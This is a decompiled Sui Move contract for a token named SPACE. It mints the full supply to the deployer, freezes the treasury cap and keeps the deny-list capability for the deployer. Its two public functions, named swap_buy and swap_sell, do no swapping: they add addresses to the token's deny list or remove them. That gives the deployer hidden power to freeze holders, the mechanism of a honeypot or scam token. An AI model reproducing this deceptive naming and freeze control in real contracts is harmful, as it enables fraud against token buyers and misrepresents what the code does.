module 0x945dfeef81cc161a065409c4b3f1e2544f9d23159659ed25c2ac7f6b1aedf0c3::space {
    struct SPACE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SPACE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SPACE>(arg0, 9, b"space", x"484f4c44494e4720535041434520f09fa799f09f8fbfe2808de29980efb88f", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXcLaRFztEFt6X2HGKgFoQ4ETVKNiw8bpgK4JmxtPDL9M"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SPACE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SPACE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SPACE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SPACE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SPACE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SPACE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SPACE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SPACE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

